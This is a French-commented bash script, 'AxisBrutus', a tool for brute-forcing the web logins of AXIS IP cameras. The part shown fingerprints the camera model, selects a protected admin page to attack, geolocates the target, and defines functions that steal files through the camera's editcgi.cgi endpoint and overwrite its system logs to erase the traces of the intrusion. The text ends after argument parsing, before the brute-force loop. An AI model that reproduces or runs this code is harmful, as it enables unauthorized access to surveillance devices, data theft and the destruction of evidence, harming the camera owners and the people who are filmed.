#!/bin/bash
# CHORFA Alla-eddine
# h4ckr213dz@gmail.com
#
# CHANGELOG:
# 2.0 [27.07.2019]:
#
#	- Ajout information : 
#		- Affichage de la durée de l'attaque dans le résumé
#		- Affichage de la progression de l'attaque cen %
#
#	- Amelioration : 
#		- Curl :
#			--connect-timeout 10 (s)
#			--max-time 20 (s) 
#
#	- Ajout de modeles verifiés : 
#		- AXIS 2110 Network Camera
#
#	- Optimisations : 
#		- Simplifications du script
#		- Ajout de com	mentaires au script
#
####################################################################################################################
#                                                     AxisBrutus
####################################################################################################################
ab_auteur='CHORFA Alla-eddine'
ab_date_creation='25.07.2019'
ab_date_maj='29.07.2019 17:21'
ab_ver='2.0'
ab_contact='h4ckr213dz@gmail.com'
ab_web='https://github.com/dino213dz/'
ab_slogan='La plus fine des brutes!'

####################################################################################################################
#                                                      VARIABLES
####################################################################################################################
dossier_mdps='./cracked'
mdp_wordlist='./wordlists/axis_mdp.txt'
users_wordlist='./wordlists/axis_users.txt'
fichier_mdp_trouve_default="AXIS_~MODELE~-IP_~IP~-INFOS.txt"
modele_nondetecte='AXIS inconnu inconnue'
fichier_mdp_trouve=$fichier_mdp_trouve_default
tmp='/tmp/axis.html'

#Inti. var. styles
rouge='\033[1;31m'
rouge_fonce='\033[0;31m'
jaune='\033[1;33m'
jaune_fonce='\033[0;33m'
vert='\033[1;32m'
vert_fonce='\033[0;32m'
cyan='\033[1;36m'
cyan_fonce='\033[0;36m'
bleu='\033[1;34m'
bleu_fonce='\033[0;34m'
magenta='\033[1;35m'
magenta_fonce='\033[0;35m'
blanc='\033[1;37m'
gris='\033[0;37m'
italic='\033[3m'
souligne='\033[4m'
reset='\033[0m'


#BANNIERES

#Banniere principale:
#axisbrutus briques
banniere='IF9fX19fICAgICBfICAgICBfX19fXyAgICAgICAgIF8gICAgICAgICAgIAp8ICBfICB8XyBffF98X19ffCBfXyAgfF9fXyBfIF98IHxfIF8gXyBfX18gCnwgICAgIHxfJ198IHxfIC18IF9fIC18ICBffCB8IHwgIF98IHwgfF8gLXwKfF9ffF9ffF8sX3xffF9fX3xfX19fX3xffCB8X19ffF98IHxfX198X19ffAo='
#axisbrutus sang
banniere='IOKWhOKWhOKWhCAgICAgIOKWkuKWiOKWiCAgIOKWiOKWiOKWkiDilojilojilpMgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paE4paE4paE4paEICAgIOKWiOKWiOKWgOKWiOKWiOKWiCAgIOKWiCAgICDilojilogg4paE4paE4paE4paI4paI4paI4paI4paI4paTIOKWiCAgICDilojiloggICDilojilojilojilojilojiloggCuKWkuKWiOKWiOKWiOKWiOKWhCAgICDilpLilpIg4paIIOKWiCDilpLilpHilpPilojilojilpLilpLilojiloggICAg4paSIOKWk+KWiOKWiOKWiOKWiOKWiOKWhCDilpPilojilogg4paSIOKWiOKWiOKWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkyAg4paI4paI4paSIOKWk+KWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkuKWiOKWiCAgICDilpIgCuKWkuKWiOKWiCAg4paA4paI4paEICDilpHilpEgIOKWiCAgIOKWkeKWkuKWiOKWiOKWkuKWkSDilpPilojilojiloQgICDilpLilojilojilpIg4paE4paI4paI4paT4paI4paIIOKWkeKWhOKWiCDilpLilpPilojiloggIOKWkuKWiOKWiOKWkeKWkiDilpPilojilojilpEg4paS4paR4paT4paI4paIICDilpLilojilojilpHilpEg4paT4paI4paI4paEICAgCuKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWiCAg4paRIOKWiCDilogg4paSIOKWkeKWiOKWiOKWkSAg4paSICAg4paI4paI4paS4paS4paI4paI4paR4paI4paAICDilpLilojilojiloDiloDilojiloQgIOKWk+KWk+KWiCAg4paR4paI4paI4paR4paRIOKWk+KWiOKWiOKWkyDilpEg4paT4paT4paIICDilpHilojilojilpEgIOKWkiAgIOKWiOKWiOKWkgog4paT4paIICAg4paT4paI4paI4paS4paS4paI4paI4paSIOKWkuKWiOKWiOKWkuKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkuKWkeKWk+KWiCAg4paA4paI4paT4paR4paI4paI4paTIOKWkuKWiOKWiOKWkuKWkuKWkuKWiOKWiOKWiOKWiOKWiOKWkyAgIOKWkuKWiOKWiOKWkiDilpEg4paS4paS4paI4paI4paI4paI4paI4paTIOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkgog4paS4paSICAg4paT4paS4paI4paR4paS4paSIOKWkSDilpHilpMg4paR4paR4paTICDilpIg4paS4paT4paSIOKWkiDilpHilpHilpLilpPilojilojilojiloDilpLilpEg4paS4paTIOKWkeKWkuKWk+KWkeKWkeKWkuKWk+KWkiDilpIg4paSICAg4paSIOKWkeKWkSAgIOKWkeKWkuKWk+KWkiDilpIg4paSIOKWkiDilpLilpPilpIg4paSIOKWkQogIOKWkiAgIOKWkuKWkiDilpHilpHilpEgICDilpHilpIg4paRIOKWkiDilpHilpEg4paR4paSICDilpEg4paR4paS4paR4paSICAg4paRICAg4paR4paSIOKWkSDilpLilpHilpHilpHilpLilpEg4paRIOKWkSAgICAg4paRICAgIOKWkeKWkeKWkuKWkSDilpEg4paRIOKWkSDilpHilpIgIOKWkSDilpEKICDilpEgICDilpIgICAg4paRICAgIOKWkSAgIOKWkiDilpHilpEgIOKWkSAg4paRICAg4paRICAgIOKWkSAgIOKWkeKWkSAgIOKWkSAg4paR4paR4paRIOKWkSDilpEgICDilpEgICAgICAg4paR4paR4paRIOKWkSDilpEg4paRICDilpEgIOKWkSAgCiAgICAgIOKWkSAg4paRIOKWkSAgICDilpEgICDilpEgICAgICAgIOKWkSAgIOKWkSAgICAgICAgIOKWkSAgICAgICAg4paRICAgICAgICAgICAgICAgICDilpEgICAgICAgICAgIOKWkSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo='

#Banniere dino213dz
banniere_dino213dz='X19fX19fX18gIC5fX18gX19fX19fXyAgIF9fX19fX19fICAgX19fX19fX18gIF9fX19fX19fX19fXyBfX19fX19fXyAgX19fX19fX19fXwpcX19fX19fIFwgfCAgIHxcICAgICAgXCAgXF9fX19fICBcICBcX19fX18gIFwvXyAgIFxfX19fXyAgXFxfX19fX18gXCBcX19fXyAgICAvCiB8ICAgIHwgIFx8ICAgfC8gICB8ICAgXCAgLyAgIHwgICBcICAvICBfX19fLyB8ICAgfCBfKF9fICA8IHwgICAgfCAgXCAgLyAgICAgLyAKIHwgICAgYCAgIFwgICAvICAgIHwgICAgXC8gICAgfCAgICBcLyAgICAgICBcIHwgICB8LyAgICAgICBcfCAgICBgICAgXC8gICAgIC9fIAovX19fX19fXyAgL19fX1xfX19ffF9fICAvXF9fX19fX18gIC9cX19fX19fXyBcfF9fXy9fX19fX18gIC9fX19fX19fICAvX19fX19fXyBcCiAgICAgICAgXC8gICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICAgXC8gICAgICAgICAgIFwvICAgICAgICBcLyAgICAgICAgXC8K'

#Banniere fichier export
#axisbrutis petit
banniere_export='ICBfXyAgIF8gIF8gIF9fICBfX19fICBfX19fICBfX19fICBfICBfICBfX19fICBfICBfICBfX19fIAogLyBfXCAoIFwvICkoICApLyBfX18pKCAgXyBcKCAgXyBcLyApKCBcKF8gIF8pLyApKCBcLyBfX18pCi8gICAgXCApICAoICApKCBcX19fIFwgKSBfICggKSAgIC8pIFwvICggICkoICApIFwvIChcX19fIFwKXF8vXF8vKF8vXF8pKF9fKShfX19fLyhfX19fLyhfX1xfKVxfX19fLyAoX18pIFxfX19fLyhfX19fLwo='

#Banniere logs:
#ghost
banniere_logs='ICBfX19fX19fXy5fXyAgICAgICAgICAgICAgICAgICAgX18gICAKIC8gIF9fX19fL3wgIHxfXyAgIF9fX18gIF9fX19fX18vICB8XyAKLyAgIFwgIF9fX3wgIHwgIFwgLyAgXyBcLyAgX19fL1wgICBfX1wKXCAgICBcX1wgIFwgICBZICAoICA8Xz4gKV9fXyBcICB8ICB8ICAKIFxfX19fX18gIC9fX198ICAvXF9fX18vX19fXyAgPiB8X198ICAKICAgICAgICBcLyAgICAgXC8gICAgICAgICAgIFwvICAgICAgCg=='
#droid
banniere_logs='ICAgICAgICAgICAgICAuYW5kQUhIQWJubi4KICAgICAgICAgICAuYUFISEhBQVVVQUFISEhBbi4KICAgICAgICAgIGRIUF5+IiAgICAgICAgIn5eVEhiLgogICAgLiAgIC5BSEYgICAgICAgICAgICAgICAgWUhBLiAgIC4KICAgIHwgIC5BSEhiLiAgICAgICAgICAgICAgLmRISEEuICB8CiAgICB8ICBISEFVQUFIQWJuICAgICAgYWRBSEFBVUFIQSAgfAogICAgSSAgSEZ+Il9fX19fICAgICAgICBfX19fIF1ISEggIEkKICAgSEhJIEhBUEsiIn5eWVVIYiAgZEFISEhISEhISEhIIElISAogICBISEkgSEhIRD4gLmFuZEhIICBISFVVUF5+WUhISEggSUhICiAgIFlVSSBdSEhQICAgICAiflkgIFB+IiAgICAgVEhIWyBJVVAKICAgICIgIGBISyAgICAgICAgICAgICAgICAgICBdSEgnICAiCiAgICAgICAgVEhBbi4gIC5kLmFBQW4uYi4gIC5kSEhQCiAgICAgICAgXUhISEhBQVVQIiB+fiAiWVVBQUhISEhbCiAgICAgICAgYEhIUF5+IiAgLmFubm4uICAifl5ZSEgnCiAgICAgICAgIFlIYiAgICB+IiAiIiAifiAgICBkSEYKICAgICAgICAgICJZQWIuLmFiZEhIYm5kYm5kQVAiCiAgICAgICAgICAgVEhIQUFiLiAgLmFkQUhIRgogICAgICAgICAgICAiVUhISEhISEhISEhVIgogICAgICAgICAgICAgIF1ISFVVSEhISEhIWwogICAgICAgICAgICAuYWRISGIgIkhISEhIYm4uCiAgICAgLi5hbmRBQUhISEhISGIuQUhISEhISEhBQWJubi4uCi5uZEFBSEhISEhIVVVISEhISEhISEhIVVBefiJ+XllVSEhIQUFibi4KICAifl5ZVUhIUCIgICAifl5ZVUhIVVAiICAgICAgICAiXllVUF4iCiAgICAgICAiIiAgICAgICAgICJ+fiIK'

#Banniere diverses:
#bravo
banniere_bravo='4paE4paE4paE4paEwrcg4paE4paE4paEICAg4paE4paE4paEwrcgIOKWjCDilpDCtyAgICAgIOKWhOKWhCAK4paQ4paIIOKWgOKWiOKWquKWgOKWhCDilojCt+KWkOKWiCDiloDilogg4paq4paIwrfilojilozilqogICAgIOKWiOKWiOKWjArilpDilojiloDiloDilojiloTilpDiloDiloDiloQg4paE4paI4paA4paA4paIIOKWkOKWiOKWkOKWiOKAoiDiloTilojiloDiloQg4paQ4paIwrcK4paI4paI4paE4paq4paQ4paI4paQ4paI4oCi4paI4paM4paQ4paIIOKWquKWkOKWjCDilojilojilogg4paQ4paI4paMLuKWkOKWjC7iloAgCsK34paA4paA4paA4paAIC7iloAgIOKWgCDiloAgIOKWgCAuIOKWgCAgIOKWgOKWiOKWhOKWgOKWqiDiloAgCg=='
#aide
banniere_aide=$banniere_export

#Inti. var. travail
curl_timeout=5
curl_maxtime=10
succes='Administration'
echec='Unauthorized'
msg_succes="Authentification réussie! ([P4wn3d])"
msg_echec="Echec de l'authentification!"
heure_depart=$(/bin/date +%s)
mdp_trouve=''
echec_js=''
echec_404=''
skipModeleDetect='NON'
skipGeo='NON'
total_fait=0
modeles_verifie=''
urlforced=''
exportforced=''
args=("$@")
nb_args=$#

#liste des modeles testés
liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" "211" "211M" "212" "213" "214" "215" "221" "223M" "225FD" "233D" "240Q" "241Q" "241S" "247S" "2100" "2110" "2120" "2401+" "F44" "M1004-W" "M1011" "M1011-W" "M1013" "M1014" "M1025" "M1031-W" "M1034-W" "M1054" "M1104" "M1113" "M1114" "M1124" "M1125" "M20" "M2025-LE" "M3004" "M3005" "M3006" "M3007" "M3011" "M3024-L" "M3025" "M3026" "M3027" "M3045-V" "M3104-LVE" "M3113" "M3204" "M5014" "M5014-V" "M7001" "M7011" "M7014" "M7016" "P12" "P12/M20" "P1343" "P1344" "P1346" "P1347" "P1354" "P1355" "P1357" "P1365" "P1405-LE" "P1425-E" "P1427-LE" "P1428-E" "P3224-LV" "P3225-LVE" "P3304" "P3343" "P3344" "P3346" "P3354" "P3363" "P3364" "P3364-L" "P3365" "P3367" "P5414-E" "P5415-E" "P5512" "P5512-E" "P5532" "P5532-E" "P5534-E" "P5635-E" "P7214" "Q1604" "Q1755" "Q1765-LE" "Q1775" "Q6032-E" "Q6034-E" "Q6035-E" "Q6042" "Q6042-E" "Q6044-E" "Q6045-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q7401")

####################################################################################################################
#                                                       FONCTIONS
####################################################################################################################

#FUNCTION:
# detecte le modele de la camera axis et la version du firmware si disponible: <AXIS modele Network Camera X.XX>
# elle recupere l'info depuis la balise <TITLE> de la fenetre
# lurl ciblee depend du modele de la cam
function fullModeleDetect {

	ip_cam=$1
	
	url_a_verifier=( "/index2.shtml" "/view/index.shtml" "/view/index2.shtml?newstyle=&cam=" "/view/view.shtml?id=354&imagepath=%2Fmjpg%2Fvideo.mjpg&size=1" "/view/viewer_index.shtml" "/admin/admin.shtml" "/" )

	
	for url_possible in ${url_a_verifier[*]}; do	
		modele_complet=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -k -s "http://$ip_cam$url_possible"  |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)	
		
		if [[ "$modele_complet" = "" ]] ||  [[ "$modele_complet" = " " ]] || [[ -z "${modele_complet##*Index*}" ]] || [[ -z "${modele_complet##*Unauthorized*}" ]] ||   [[ -z "${modele_complet##*Not*}" ]]  ||  [[ -z "${modele_complet##*page*}" ]] ;then
			modele_complet=$modele_nondetecte
			continue
		else 
			break
		fi

	done

	echo $modele_complet
	}



#FUNCTION:
# detecte si erreur 401 : page non autorisée
function checkUrlProtegee {
	url_checker_p=$1	
	test_url_p=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_p|grep -i '401 ')
	if [ ${#test_url_p} -gt 0 ];then
		protegee='OUI'$test_url_p"/"$url_checker_p
	else
		protegee="NON"
	fi
	echo $protegee
	}

#FUNCTION:
# detecte si erreur 404 : page introuvable
function checkUrlExiste {
	url_checker_e=$1	
	test_url_e=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_e|grep -i '404 ')
	if [ ${#test_url_e} -gt 0 ];then
		existe="NON"$test_url_e"/"$url_checker_e" {$curl_timeout}"
	else
		existe='OUI'
	fi
	echo $existe
	}

#FUNCTION:
# detecte le modele de la camera axis
function modeleExtract {
	#pb ici : les modeles ne sont plus corrects suite à la creation des fonctions
	m_c_cam="$1"
	m_c_cam=$(echo -e "$m_c_cam"|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
	m_c_cam=${m_c_cam/.*[aA][xX][iI][sS]/axis}
	echo -e "$m_c_cam"

	}

#FUNCTION:
# detecte la version du firmware
function versionDetect {
	v_c_cam=$1	
	v_c_cam=$(echo $v_c_cam|rev|cut -d " " -f 1|rev)
	echo $v_c_cam

	}

#FUNCTION:
# definit l'url à attaquer selon le modele
function urlModele {
	ip_cam=$1	
	modele_cam=$2	
	# modele par defaut : le plus commun	
	url_cam="http://$ip_cam/operator/basic.shtml"

	# old generation
	if  [ "$modele_cam" = "2100" ] || [ "$modele_cam" = "2110" ] || [ "$modele_cam" = "2120" ] || [ "$modele_cam" = "2401+" ] || [ "$modele_cam" = "2401" ];then 
		url_cam="http://$ip_cam/admin/admin.shtml" 
	fi

	# AXIS Q6055-E : contient du JS
	if [ "$modele_cam" = "Q6054-E" ] ;then 
		url_cam="http://$ip_cam/axis-cgi/admin/paramlist.cgi"
	fi

	# AXIS P3367
	#if [ "$modele_cam" = "P3367" ] ;then 
	#	url_cam="http://$ip_cam/operator/videostream.shtml?id=1312"
	#fi

	# Page introuvable
	if [ "$modele_cam" = "N/A" ] || [[ "$modele_cam" =~ "inconnu" ]] || [[ "$modele_cam" = "" ]];then 
		url_tester_aleatoirement=( "/operator/basic.shtml" "/admin/admin.shtml" "/admin/users.shtml" "/view/indexFrame.shtml" "" )
		test_url_existe='NON'
		test_url_protect='NON'
		for url_de_test in ${url_tester_aleatoirement[*]} ;do
			url_cam="http://$ip_cam$url_de_test"
			test_url_existe=$(checkUrlExiste $url_cam)
			if [ "$test_url_existe" = 'OUI' ];then
				test_url_protect=$(checkUrlProtegee $url_cam)
				if [ "$test_url_protect" = 'OUI' ];then
					break
				fi
			fi
		done
	fi
	
	#si quand meme on ne trouve pas de page protegee a attaquer: on attaque la racine directement
	test_url=$(checkUrlExiste $url_cam)
	if [[ "$test_url" =~ 'NON' ]]; then 
		url_cam="http://$ip_cam/"
	fi
	echo $url_cam
	}

#FUNCTION:
# 
function infosGeolocalisation {
	ip_port=$1
	ip_only=${ip_port%:*}

	infosDbIpDotCom=$(curl -ks http://api.db-ip.com/v2/free/$ip_only)

	#retirer les infos inutiles
	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
	infosDbIpDotCom=${infosDbIpDotCom/'"continentCode'*'countryName:'/'Pays:'}
	

	#Mise en forme pour le script
	infosDbIpDotCom=${infosDbIpDotCom/'}'/''}
	infosDbIpDotCom=${infosDbIpDotCom/'{'/''}
	infosDbIpDotCom=${infosDbIpDotCom//'"'/''}	
	
	#Traduction
	infosDbIpDotCom=${infosDbIpDotCom/'stateProv:'/'Département/Etat:'}
	infosDbIpDotCom=${infosDbIpDotCom/'city:'/'Ville/Commune:'}

	echo $infosDbIpDotCom
	}

#FUNCTION:
# 
function addZeros {
	nombre_max=$1
	nombre_actuel=$2	
	serie_de_zeros=''

	nb_zeros=$(( ${#nombre_max} - ${#nombre_actuel} -1 ))
	for noz in $(seq 0 $nb_zeros); do
		serie_de_zeros="0"$serie_de_zeros
	done

	echo $serie_de_zeros$nombre_actuel
	}

#FUNCTION:
# verifie l'existence des fichiers
function fichierExiste {
	fichier_a_verifier=$1

	if [[ -f $fichier_a_verifier ]];then
		resultat='OUI'
	else
		resultat='NON'
	fi
	
	echo $resultat
	}

#FUNCTION:
# verifie l'existence des fichiers
function effacerTraces {
	ip_cam=$1
	
	fichiers_a_vider=('/var/log/messages' '/var/log/messages.old')

	fichier_temp='/tmp/fichier_vole.txt'	
	contenu=$(echo -e $banniere_logs|base64 -d)
	
	for fic_a_vid in ${fichiers_a_vider[*]} ;do
		curl -ks "http://$ip_cam/admin-bin/editcgi.cgi?file=$fic_a_vid" -d "save_file=$fic_a_vid&mode=0100666&convert_crlf_to_lf=on&submit= Save file &content=$contenu" --connect-timeout $curl_timeout --max-time $curl_maxtime --user $user:$mdp > $fichier_temp 
	done
	
	}

#FUNCTION:
# verifie l'existence des fichiers
function voleFichier {
	ip_cam=$1
	fichier_a_voler=$2
	fichier_temp='/tmp/fichier_vole.txt'
	url_vole="http://$ip_cam/admin-bin/editcgi.cgi?file=$fichier_a_voler"
	curl -ks --connect-timeout $curl_timeout --max-time $curl_maxtime "$url_vole" --user $user:$mdp  > $fichier_temp #silent_get=$()
	fichier_vole=''
	record=''
	while read ligne; do
		if [[ "$ligne" =~ '</textarea' ]];then
			record='OFF'
			fichier_vole=$fichier_vole${ligne/'</textarea>'/''}"\n"
		fi
		if [[ "$record" = "ON" ]];then
			#ligne vides?!
			#if [[ "${ligne// /}" != "" ]];then
				#fichier_vole=$fichier_vole$ligne"\n"
			fichier_vole=$fichier_vole${ligne//\\r/\\n}"\n"
			#fi
		fi

		if [[ "$ligne" =~ '<textarea' ]];then
			record='ON'
		fi
		
	done < $fichier_temp

	echo -en $fichier_vole

	}


#FUNCTION:
# verifie l'existence des fichiers
function ajouterEspacesSlogans {
	texte="$1"
	espaces="$2"
	banniereEnUneLigne=$(echo -e $banniere|base64 -d)

	largeurTexte=${#texte}
	largeurBanniere=$(( ${#banniereEnUneLigne}/10 ))
	tailleEspaces=$(( $largeurBanniere - $largeurTexte ))

	for e in $(seq 1 $tailleEspaces); do 
		espaces=$espaces$italic" "
	done
	
	echo $espaces
	}


#FUNCTION:
# verifie l'existence des fichiers
function afficherAide {
	aide_texte="CiMgRGVzY3JpcHRpb246CiAtIExhIHBsdXMgZmluZSBkZXMgYnJ1dGVzIQogLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwogLSBOZWNlc3NpdGUgdW4gZmljaGllciBtZHAgZXQgdW4gZmljaGllciB1c2VybmFtZXMgOgoJMS0gLi93b3JkbGlzdHMvYXhpc19tZHBfbGlnaHQudHh0CgkyLSAuL3dvcmRsaXN0cy9heGlzX21kcF9saWdodC50eHQKIC0gQ2VzIGZpY2hpZXJzIGNvbnRpZW5uZXQgbGVzIGxvZ2lucyBldCBtb3QtZGUtcGFzc2UgcGFyIGRlZmF1dCBkZXMgY2FtZXJhcyBBeGlzLgoKIyBTeW50YXhlOgogLSAkPiAuL2F4aXNCcnV0dXMuc2ggW09QVElPTlNdIC0tY2libGV8LWMgSVB8SVA6UE9SVAoKIyBQYXJhbWV0cmVzIG9ibGlnYXRvaXJlczoKIC0gLS1jaWJsZSwgLWMgOiBJUCwgSVA6UE9SVCwgVVJMCgojIFBhcmFtZXRyZXMgb3B0aW9ubmVsczoKIC0gLS1za2lwLCAtcyA6IE4nZWZmZWN0dWUgcGFzIGxhIGRldGVjdGlvbiBkdSBtb2RlbGUuIEwndXJsIGNpYmxlIHNlcmEgIi9vcGVyYXRvci9iYXNpYy5zaHRtbCIuIEwnYXJndW1lbnQgLS11cmwgcGV1dCBldHJlIHV0aWxpc8OpIHBvdXIgY2hhbmdlciBsJ3VybCBjaWJsZS4KIC0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2RlbGVzIGRlIGNhbWVyYSBjb21wYXRpYmxlcwogLSAtLWhlbHAsIC1oIDogYWZmaWNoZSBsJ2FpZGUKIC0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKIC0gLS1wYXNzd29yZHMsIC1wIDogZmljaGllciB3b3JkbGlzdCBjb250ZW5hbnQgbGEgbGlzdGUgZGVzIG1vdHMtZGUtcGFzc2UKIC0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwogLSAtLWV4cG9ydCwgLS1vdXRwdXQsIC1vIDogZmljaGllciBkYW5zIGxlcXVlbCBsZSBtb3QtZGUtcGFzc2Ugc2VyYSBlbnJlZ2lzdHLDqSBzJ2lsIGVzdCB0cm91dsOpLiBBdWN1biBmaWNoaWVyIGNyw6nDqSBzaSBsZSBtb3QtZGUtcGFzc2Ugbidlc3QgcGFzIHRyb3V2w6kKIC0gLS11cmwsIC1yIDogTCd1cmwgZMOpcGVuZCBkdSBtb2RlbGUuIFZvdXMgcG92ZXogbGUgbW9kaWZpZXIgc2kgdm91cyBzb3VoYWl0ZXogdGVzdGVyIHVuZSBwYWdlIHdlYiBwcsOpY2lzZSBhdmVjIHVuIG1vZGVsZSBpbmNvbm51IHBhciBleGVtcGxlCgojIEV4ZW1wbGVzOgogLSBBdHRhcXVlIHN0YW5kYXJkIHBhciBpcCBvdSBwYXIgdXJsLiBsZXMgd29yZGxpc3QgdXRpbGlzw6lzIGljaSBzb250IGNldXggcGFyIGRlZmF1dC4gKFZvaXIgIkRlc2NyaXB0aW9uIikKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSBodHRwOi8vMTkyLjIzLjM2LjI1NDo4MwoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cHM6Ly9tYUNhbWVyYUlwMjEzZHouYXhpcy5jb20vCgogLSBBZmZpY2hlciBsYSBsaXN0ZSBkZXMgbW9kw6hsZXMgY29tcGF0aWJsZXMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1saXN0CgogLSBQYXMgZGUgZ2VvbG9jYWxpc2F0aW9uCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbm8tZ2VvCgogLSBQYXMgZGUgZGV0ZWN0aW9uIGR1IG1vZGVsZS4gb24gZMOpZmluaXQgbGUgVEFSR0VUVVJJIG1hbnVlbGxlbWVudC4KCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1za2lwIC0tdXJsIC9hZG1pbi9hZG1pbi5zaHRtbAoKIC0gRGVmaW5pciB1bmUgbGlzdGUgZGUgbG9naW4gbW90LWRlLXBhc3NlIAoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLXBhc3N3b3JkcyAuL2F4aXNfcGFzcy50eHQgLS11c2VybmFtZXMgLi9heGlzX3VzZXJuYW1lcy50eHQgCgogLSBEZWZpbmlyIGxlIGZpY2hpZXIgZGUgc2F1dmVnYXJkZToKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1leHBvcnQgbWRwX2F4aXNfdGVzdC50eHRdCgojIEFsZ29yaXRobWU6CiAtIFLDqWN1cGVyZXIgbGUgbW9kZWxlIGRlIGxhIGNhbWVyYQogLSBSZWN1cGVyZXIgbGUgZmlybXdhcmUgCiAtIFJlY2hlcmNoZSBkJ1VSTCBwcm90ZWfDqWUgcGFyIG1vdC1kZS1wYXNzZSAKIC0gQnJ1dGVmb3JjZQogLSBTaSBtb3QgZGUgcGFzc2UgdHJvdXbDqToKIC0gVGVsZWNoYXJnZXIgbGVzIGZpY2hpZXJzIGRlIGNvbmZpZ3VyYXRpb24KIC0gU2F1dmVnYXJkZSBkZXMgZG9ubsOpZXMKIC0gRWZmYWNlciBsZXMgbG9ncwoK"
	echo -e $banniere_aide$aide_texte|base64 -d
	}

####################################################################################################################
#                                                       ARGUMENTS
####################################################################################################################
#recuperation et traitement des arguments
for no_arg in $(seq 0 $nb_args); do
	valeur=${args[$no_arg]}
	if [ ${#valeur} -gt 0 ];then
		#parametre obligatoire

		#cible attaquée: ip, ip:port, url
		if [ "$valeur" = "--cible" ] || [ "$valeur" = "-c" ];then
			ip=${args[$(($no_arg+1))]}
			ip=${ip/https:\/\//}
			ip=${ip/http:\/\//}
			ip=${ip//\//}
		fi
		#parametres optionnels

		#TARGETURI definie manuellement
		if [ "$valeur" = "--url" ] || [ "$valeur" = "-r" ];then
			urlforced='OUI'
			targeturi=${args[$(($no_arg+1))]}
			if [ "${targeturi:0:1}" = "/" ]; then
				url="http://$ip$targeturi"			
			else
				url="http://$ip/$targeturi"
			fi
		fi
		#wordlist usernames définie
		if [ "$valeur" = "--usernames" ] || [ "$valeur" = "-u" ];then
			users_wordlist=${args[$(($no_arg+1))]}
			nb_users=$(cat $users_wordlist|wc -l)
		fi
		#wordlist mdp définie
		if [ "$valeur" = "--passwords" ] || [ "$valeur" = "-p" ];then
			mdp_wordlist=${args[$(($no_arg+1))]}
			nb_mdp=$(cat $mdp_wordlist|wc -l)
		fi
		#fichier destination si mdp trouvé
		if [ "$valeur" = "--export" ] || [ "$valeur" = "--output" ] || [ "$valeur" = "-o" ];then
			exportforced='OUI'
			fichier_mdp_trouve=${args[$(($no_arg+1))]}
		fi
		#sauter la verification du modele
		if [ "$valeur" = "--skip" ] || [ "$valeur" = "-s" ];then
			skipModeleDetect='OUI'
		fi
		#sauter la geolocalisation
		if [ "$valeur" = "--no-geo" ] || [ "$valeur" = "--nogeo" ] || [ "$valeur" = "-g" ];then
			skipGeo='OUI'
		fi
		#parametres optionnels informatifs/pas d'attaques/quitte apres avoir executé l'option

		#lister les modeles testés
		if [ "$valeur" = "--list" ] || [ "$valeur" = "-l" ];then
			echo -e "Liste des modeles testés et validés: "${#liste_modeles_verifies[*]}" au total!"
			for mod in ${liste_modeles_verifies[*]}; do
				echo -e " - AXIS $mod Network Camera"
			done
			exit
		fi
		#affichage aide 
		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
			afficherAide
			exit
		fi
	fi
done


#Si aucun cible n'est precisée : on quite en affichant un message d'erreur
if [ ${#ip} -eq 0 ];then
	echo -e "ERREUR!"
	echo -e " Vous devez specifier une cible avec l'argument '--cible ou -c'.\nExemple: $0 --cible 127.18.27.33"
	echo -e " Vous pouvez afficher l'aide avec l'argument '--help' ou '-h'."
	exit
fi

####################################################################################################################
#                                               VERFIFICATIONS FICHIERS
####################################################################################################################
liste_fichiers_a_verifier=( "$users_wordlist" "$mdp_wordlist" )

for fichier in ${liste_fichiers_a_verifier[*]}; do
	test_fichier=$(fichierExiste $fichier)
	if [ "$test_fichier" != 'OUI' ];then
		echo -e "$rouge>ERREUR: Le fichier suivant n'a pas été trouvé :\n$vert_fonce$italic$fichier"
		exit
	fi
done

#On calcul le nombre de probabilités si les fichiers  existent
nb_mdp=$(cat $mdp_wordlist|wc -l)
nb_users=$(cat $users_wordlist|wc -l)
